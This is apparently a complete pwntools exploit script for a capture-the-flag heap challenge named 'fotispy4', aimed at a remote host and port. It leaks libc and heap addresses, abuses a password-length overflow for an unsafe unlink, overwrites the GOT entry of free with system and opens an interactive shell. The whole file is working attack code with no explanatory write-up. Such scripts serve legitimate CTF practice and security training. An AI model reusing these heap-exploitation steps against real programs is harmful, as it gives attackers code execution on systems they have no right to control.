
#!/usr/bin/env python3
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './fotispy4_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
# libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "52.59.124.14", 5194


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
b *_IO_flush_all_lockp
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'debug'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if (not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB):
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
def menu(op):
    sla(": ", str(op).encode())

def create_user(username, password):
    menu(0)
    sla("username: ", username)
    sla("password: ", password)


def switch(idx:int):
    menu(1)
    sla(b"[0-15]: ", str(idx).encode())

def edit(new_name:bytes, new_pwd:bytes):
    menu(2)
    sla(b"[~] Enter new name: ", new_name)
    sla(b"[~] Enter new password: ", new_pwd)  # BUG: takes 0x50 for password

def show():
    menu(3)
    ru("Username: ")

def delete():
    menu(4)

def exploit():
    global io
    io = initialize()
    debug()

    with log.progress("Preparing chunk"), context.silent:
        create_user(b"user1", b"pass1")
        create_user(b"user2", b"pass2")
        create_user(b"user3", b"pass3")
        create_user(b"user4", b"pass4")
        switch(0)
        delete()
        show()
        libc_leak = u64(rl().strip().ljust(8, b"\x00"))
        libc.address = libc_leak - (libc.sym["main_arena"] + 88)
        create_user(b"user1", b"pass1")
    leak("Libc leak", hex(libc_leak))
    leak("Libc base address", hex(libc.address))

    with log.progress("Heap leak"), context.silent:
        switch(0)
        edit(b"A", b"\x00"*0x48 + p64(0x21))
        switch(1)
        edit(b"\x00"*0x18 + p64(0x71), b"A")
        delete()

        switch(2)
        edit(b"A", b"\x00"*0x48 + p64(0x21))
        switch(3)
        edit(b"\x00"*0x18 + p64(0x71), b"A")
        delete()

        show()
        heap_leak = u64(rl().strip().ljust(8, b"\x00"))
        heap = heap_leak & ~0xfff
    leak("Heap leak", hex(heap_leak))
    leak("Heap base", hex(heap))
    with log.progress("Unsafe unlink"), context.silent:
        target = 0x6020e8
        create_user(p64(0)*2 + p64(target - 0x18) + p64(target - 0x10), b"")
        create_user(b"", b"")
        create_user(b"/bin/sh\0", b"")
        switch(5)
        edit(b"\x00", b"\x00"*0x40 + p64(0x80) + p64(0x90))
        switch(6)
        delete()

    with log.progress("Overwrite got free with system"), context.silent:
        switch(5)
        edit(p64(elf.got["free"])[:-1], b"")
        switch(2)
        edit(p64(libc.sym["system"])[:-1], p64(libc.sym["atoi"])[:-1])
        switch(7)
        delete()
    io.interactive()

if __name__ == '__main__':
    exploit()
